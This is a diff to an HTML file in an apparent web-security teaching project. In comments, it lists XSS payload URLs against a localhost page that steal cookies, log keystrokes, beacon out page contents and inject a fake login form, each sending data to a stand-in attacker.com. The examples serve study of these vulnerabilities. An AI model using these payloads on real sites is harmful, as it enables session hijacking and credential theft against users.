@@ -32,6 +32,7 @@
 </html>
 
 <!-- XSS Attack -->
+<!-- Live server Base URL: http://127.0.0.1:5500 -->
 
 <!-- !User Session Hijacking -->
 <!-- This attack allows the attacker to hijack the user's session by exploiting a vulnerability in the web application. -->
@@ -43,19 +44,26 @@
 
 <!-- http://127.0.0.1:5500/src/03-security/vulnerabilities/example-1.html?name=<img src=x onerror="fetch('https://attacker.com/api/data',{method:'POST',body:JSON.stringify({data:document.cookie})})">  -->
 
-<!-- !Unauthorized Activities -->
+<!-- !Unauthorized Activities (SQL Injection) -->
 <!-- This attack allows the attacker to perform unauthorized activities on the victim's account by exploiting a vulnerability in the web application. -->
 
 <!-- http://127.0.0.1:5500/src/03-security/vulnerabilities/example-1.html?name=<img src=x onerror="fetch('https://api.com/get-users',{method:'POST',body:JSON.stringify({data:' ; DROP TABLE users; --})})">  -->
 
-<!-- !Capturing Keystrokes -->
+<!-- !Capturing Keystrokes (Keylogging) -->
 <!-- With this attack, every key the user types is sent in real-time to the attacker's server, enabling live keylogging of sensitive information like passwords or messages. -->
 
 <!-- http://127.0.0.1:5500/src/03-security/vulnerabilities/index.html?name=<img src=x onerror="document.addEventListener('keydown',e=>console.log(e.key))"> -->
 
 <!-- http://127.0.0.1:5500/src/03-security/vulnerabilities/index.html?name=<img src=x onerror="document.addEventListener('keydown',e=>fetch('https://attacker.com/api/data',{method:'POST',body:JSON.stringify({data:e.key})}))"> -->
 
-<!-- !DOM exfiltration (Image beacon) -->
+<!-- !Stealing Critical Information (DOM exfiltration (Image beacon)) -->
 <!-- This attack allows the attacker to exfiltrate the DOM of the victim's page, including the HTML, CSS, and JavaScript code. -->
 
 <!-- http://127.0.0.1:5500/src/03-security/vulnerabilities/index.html?name=<img src="empty.gif" onerror="new Image().src=`https://attacker.com?output=${document.body.innerHTML}`"> -->
+
+<!-- !Phishing Attack -->
+<!-- This attack allows the attacker to trick the victim into entering their credentials on a fake login page, which is hosted on the attacker's server. -->
+
+<!-- http://127.0.0.1:5500/src/03-security/vulnerabilities/index.html?name=<h3>Please login to proceed</h3> <form action="https://attacker.com/api/collect-data" method="POST">Username:<br/>
+<input type="username"name="username"/><br/>Password:<br/><input type="password"name="passwor
+d"/><br/><input type="submit"name="Login"/><br/></form> -->
